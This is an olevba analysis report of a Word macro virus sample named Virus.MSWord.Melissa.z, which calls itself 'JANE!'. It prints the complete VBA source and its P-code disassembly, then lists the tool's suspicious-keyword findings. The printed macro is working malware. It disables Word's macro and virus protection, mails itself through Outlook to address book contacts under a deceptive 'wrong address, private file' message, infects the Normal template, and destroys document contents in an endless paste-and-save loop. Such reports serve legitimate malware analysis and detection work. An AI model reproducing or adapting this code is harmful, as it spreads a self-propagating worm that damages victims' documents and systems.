olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Jane.cls 
in file: Virus.MSWord.Melissa.z - OLE stream: 'Macros/VBA/Jane'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Private Sub Document_Close()
On Error Resume Next
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'JANE! by The Marlboro KID (Killer In Descise)
'It's Inpired clearly by Melissa but the Infection bit is all mine
'Payload part is also by me...of course
'Use it, Loose it, Enjoy ha ha ha.....
'Not ment to make any greater harm....just for the hell of it..
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
regcheck = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
If System.PrivateProfileString("", regcheck + "9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", regcheck + "9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1)
Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
End If
Dim v1, v2, v3
Set v1 = CreateObject("Outlook.Application")
Set v2 = v1.GetNameSpace("MAPI")
RegAdd = "...made by 'The Marlboro KID'..."
If System.PrivateProfileString("", regcheck, "Jane!") <> RegAdd Then
If v1 = "Outlook" Then
v2.Logon "profile", "password"
    For y = 1 To v2.AddressLists.Count
        Set AddyBook = v2.AddressLists(y)
        x = 1
        Set v3 = v1.CreateItem(0)
        For CountIt = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            v3.Recipients.Add Peep
            x = x + 1
            If x > 78 Then CountIt = AddyBook.AddressEntries.Count
         Next CountIt
         subj = "Is this the right E-mail address..?"
         v3.Subject = subj & Application.UserName
         Mezz = "Dont know if i sent this to the right E-mail,"
         Mezz = Mezz + "if this isn't ment for you please dont look"
         Mezz = Mezz + "at the attachments, its a private file.."
         Mezz = Mezz + "ThanX ... //"
         v3.Body = Mezz & Application.UserName
         v3.Attachments.Add ActiveDocument.FullName
         v3.Send
         Peep = ""
    Next y
v2.Logoff
End If
System.PrivateProfileString("", regcheck, "Jane!") = RegAdd
End If
Set ActivDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NrmTmpl = NormalTemplate.VBProject.VBComponents.Item(1)
ADCountLn = ActivDoc.CodeModule.CountOfLines
NTCountLn = NrmTmpl.CodeModule.CountOfLines
If ActivDoc.Name = "Jane" And NrmTmpl.Name = "Jane" Then GoTo THISISTHEENDMYFRIEND
If ActiveDoc.Name <> "Jane" Then
ActivDoc.Name = "Jane"
Set Dest = ActivDoc
Set Source = NrmTmpl
End If
Dim Replace
If NrmTmpl.Name <> "Jane" Then
NrmTmpl.Name = "Jane"
Replace = True
Set Dest = NrmTmpl
Set Source = ActivDoc
End If
Dim FirstName, LastName, TotalName As String
Randomize
C1 = Int((9999 - 1 + 1) * Rnd + 1)
C2 = Int((999 - 1 + 1) * Rnd + 1)
C3 = C1 * C2
If C3 < 99000000 Then
C3 = C3 + 18900000
End If
FirstName = CStr(C3)
C1 = Int((9 - 1 + 1) * Rnd + 1)
C2 = Int((99 - 1 + 1) * Rnd + 1)
C3 = C1 * C2
If C3 < 900 Then
C3 = C3 + 101
End If
LastName = CStr(C3)
TotalName = "c:\" + FirstName + "." + LastName
If Dir(TotalName) = TotalName Then
Kill (TotalName)
End If
Open TotalName For Output As #1
If Replace = True Then
Print #1, "Private Sub Document_Close()"
Else
Print #1, "Private Sub Document_Open()"
End If
For CountIt = 1 To Source.CodeModule.CountOfLines - 1
Print #1, Source.CodeModule.Lines(CountIt + 1, 1)
Next
Close #1
Dest.CodeModule.AddFromFile TotalName
Kill (TotalName)
THISISTHEENDMYFRIEND:
doc = "Document"
If NTCountLn <> 0 And ADCountLn = 0 And (InStr(1, ActiveDocument.Name, doc) = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True
End If
If Day(Now) = 13 And WeekDay(Now) = 6 Then
MsgBox ("Jason Lives!!!!")
End If
If (Day(Now) Mod 2) <> 0 And (Hour(Now) Mod 2) <> 0 Then
If WeekDay(Now) = 2 Then
Dumb = ActiveDocument.Name
ToNice = "C:\windows\ImSoNice.Huh"
BadTime = "Jane! Jane! Jane! I need a beer! Jane! Jane! Jane!"
If Dir(ToNice) = ToNice Then
Kill (ToNice)
End If
ActiveDocument.SaveAs ToNice
ActiveDocument.SaveAs Dumb
ActiveDocument.StoryRanges(wdMainTextStory).Text = BadTime
ForeverYoung = False
While ForeverYoung = False
ActiveDocument.StoryRanges(wdMainTextStory).Copy
For m = 1 To 66
ActiveDocument.Words.Last.Paste
Next
ActiveDocument.Save
Wend
End If
End If
End Sub
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'I know i could have made this code smaller and simpler but who the f*ck cares
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.z
' ===============================================================================
' Module streams:
' Macros/VBA/Jane - 9132 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	QuoteRem 0x0000 0x003C "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #4:
' 	QuoteRem 0x0000 0x002D "JANE! by The Marlboro KID (Killer In Descise)"
' Line #5:
' 	QuoteRem 0x0000 0x0041 "It's Inpired clearly by Melissa but the Infection bit is all mine"
' Line #6:
' 	QuoteRem 0x0000 0x0026 "Payload part is also by me...of course"
' Line #7:
' 	QuoteRem 0x0000 0x0025 "Use it, Loose it, Enjoy ha ha ha....."
' Line #8:
' 	QuoteRem 0x0000 0x003E "Not ment to make any greater harm....just for the hell of it.."
' Line #9:
' 	QuoteRem 0x0000 0x003E "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #10:
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	St regcheck 
' Line #11:
' 	LitStr 0x0000 ""
' 	Ld regcheck 
' 	LitStr 0x0011 "9.0\Word\Security"
' 	Add 
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #12:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	Ld regcheck 
' 	LitStr 0x0011 "9.0\Word\Security"
' 	Add 
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Dim 
' 	VarDefn v1
' 	VarDefn v2
' 	VarDefn v3
' Line #21:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set v1 
' Line #22:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld v1 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set v2 
' Line #23:
' 	LitStr 0x0020 "...made by 'The Marlboro KID'..."
' 	St RegAdd 
' Line #24:
' 	LitStr 0x0000 ""
' 	Ld regcheck 
' 	LitStr 0x0005 "Jane!"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld RegAdd 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld v1 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld v2 
' 	ArgsMemCall Logon 0x0002 
' Line #27:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v2 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #28:
' 	SetStmt 
' 	Ld y 
' 	Ld v2 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #29:
' 	LitDI2 0x0001 
' 	St x 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld v1 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set v3 
' Line #31:
' 	StartForVariable 
' 	Ld CountIt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #32:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #33:
' 	Ld Peep 
' 	Ld v3 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #34:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #35:
' 	Ld x 
' 	LitDI2 0x004E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St CountIt 
' 	EndIf 
' Line #36:
' 	StartForVariable 
' 	Ld CountIt 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	LitStr 0x0023 "Is this the right E-mail address..?"
' 	St subj 
' Line #38:
' 	Ld subj 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld v3 
' 	MemSt Subject 
' Line #39:
' 	LitStr 0x002D "Dont know if i sent this to the right E-mail,"
' 	St Mezz 
' Line #40:
' 	Ld Mezz 
' 	LitStr 0x002B "if this isn't ment for you please dont look"
' 	Add 
' 	St Mezz 
' Line #41:
' 	Ld Mezz 
' 	LitStr 0x0028 "at the attachments, its a private file.."
' 	Add 
' 	St Mezz 
' Line #42:
' 	Ld Mezz 
' 	LitStr 0x000C "ThanX ... //"
' 	Add 
' 	St Mezz 
' Line #43:
' 	Ld Mezz 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld v3 
' 	MemSt Body 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld v3 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #45:
' 	Ld v3 
' 	ArgsMemCall Send 0x0000 
' Line #46:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #47:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld v2 
' 	ArgsMemCall Logoff 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld RegAdd 
' 	LitStr 0x0000 ""
' 	Ld regcheck 
' 	LitStr 0x0005 "Jane!"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActivDoc 
' Line #53:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NrmTmpl 
' Line #54:
' 	Ld ActivDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCountLn 
' Line #55:
' 	Ld NrmTmpl 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCountLn 
' Line #56:
' 	Ld ActivDoc 
' 	MemLd New 
' 	LitStr 0x0004 "Jane"
' 	Eq 
' 	Ld NrmTmpl 
' 	MemLd New 
' 	LitStr 0x0004 "Jane"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo THISISTHEENDMYFRIEND 
' 	EndIf 
' Line #57:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	LitStr 0x0004 "Jane"
' 	Ne 
' 	IfBlock 
' Line #58:
' 	LitStr 0x0004 "Jane"
' 	Ld ActivDoc 
' 	MemSt New 
' Line #59:
' 	SetStmt 
' 	Ld ActivDoc 
' 	Set Dest 
' Line #60:
' 	SetStmt 
' 	Ld NrmTmpl 
' 	Set Source 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Dim 
' 	VarDefn Replace
' Line #63:
' 	Ld NrmTmpl 
' 	MemLd New 
' 	LitStr 0x0004 "Jane"
' 	Ne 
' 	IfBlock 
' Line #64:
' 	LitStr 0x0004 "Jane"
' 	Ld NrmTmpl 
' 	MemSt New 
' Line #65:
' 	LitVarSpecial (True)
' 	St Replace 
' Line #66:
' 	SetStmt 
' 	Ld NrmTmpl 
' 	Set Dest 
' Line #67:
' 	SetStmt 
' 	Ld ActivDoc 
' 	Set Source 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Dim 
' 	VarDefn FirstName
' 	VarDefn LastName
' 	VarDefn TotalName (As String)
' Line #70:
' 	ArgsCall Read 0x0000 
' Line #71:
' 	LitDI2 0x270F 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St C1 
' Line #72:
' 	LitDI2 0x03E7 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St C2 
' Line #73:
' 	Ld C1 
' 	Ld C2 
' 	Mul 
' 	St C3 
' Line #74:
' 	Ld C3 
' 	LitDI4 0x9EC0 0x05E6 
' 	Lt 
' 	IfBlock 
' Line #75:
' 	Ld C3 
' 	LitDI4 0x6420 0x0120 
' 	Add 
' 	St C3 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Ld C3 
' 	Coerce (Str) 
' 	St FirstName 
' Line #78:
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St C1 
' Line #79:
' 	LitDI2 0x0063 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St C2 
' Line #80:
' 	Ld C1 
' 	Ld C2 
' 	Mul 
' 	St C3 
' Line #81:
' 	Ld C3 
' 	LitDI2 0x0384 
' 	Lt 
' 	IfBlock 
' Line #82:
' 	Ld C3 
' 	LitDI2 0x0065 
' 	Add 
' 	St C3 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld C3 
' 	Coerce (Str) 
' 	St LastName 
' Line #85:
' 	LitStr 0x0003 "c:\"
' 	Ld FirstName 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld LastName 
' 	Add 
' 	St TotalName 
' Line #86:
' 	Ld TotalName 
' 	ArgsLd Dir 0x0001 
' 	Ld TotalName 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld TotalName 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld TotalName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #90:
' 	Ld Replace 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	PrintItemNL 
' Line #92:
' 	ElseBlock 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	PrintItemNL 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld CountIt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Source 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld CountIt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld Source 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #97:
' 	StartForVariable 
' 	Next 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #99:
' 	Ld TotalName 
' 	Ld Dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #100:
' 	Ld TotalName 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #101:
' 	Label THISISTHEENDMYFRIEND 
' Line #102:
' 	LitStr 0x0008 "Document"
' 	St doc 
' Line #103:
' 	Ld NTCountLn 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCountLn 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld doc 
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #104:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #105:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #106:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #109:
' 	LitStr 0x000F "Jason Lives!!!!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #112:
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St Dumb 
' Line #114:
' 	LitStr 0x0017 "C:\windows\ImSoNice.Huh"
' 	St ToNice 
' Line #115:
' 	LitStr 0x0032 "Jane! Jane! Jane! I need a beer! Jane! Jane! Jane!"
' 	St BadTime 
' Line #116:
' 	Ld ToNice 
' 	ArgsLd Dir 0x0001 
' 	Ld ToNice 
' 	Eq 
' 	IfBlock 
' Line #117:
' 	Ld ToNice 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	Ld ToNice 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #120:
' 	Ld Dumb 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #121:
' 	Ld BadTime 
' 	Ld wdMainTextStory 
' 	Ld ActiveDocument 
' 	ArgsMemLd StoryRanges 0x0001 
' 	MemSt Then 
' Line #122:
' 	LitVarSpecial (False)
' 	St ForeverYoung 
' Line #123:
' 	Ld ForeverYoung 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #124:
' 	Ld wdMainTextStory 
' 	Ld ActiveDocument 
' 	ArgsMemLd StoryRanges 0x0001 
' 	ArgsMemCall Copy 0x0000 
' Line #125:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0042 
' 	For 
' Line #126:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Last 
' 	ArgsMemCall Paste 0x0000 
' Line #127:
' 	StartForVariable 
' 	Next 
' Line #128:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #129:
' 	Wend 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndSub 
' Line #133:
' 	QuoteRem 0x0000 0x003C "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #134:
' 	QuoteRem 0x0000 0x004D "I know i could have made this code smaller and simpler but who the f*ck cares"
' Line #135:
' 	QuoteRem 0x0000 0x003E "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #136:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

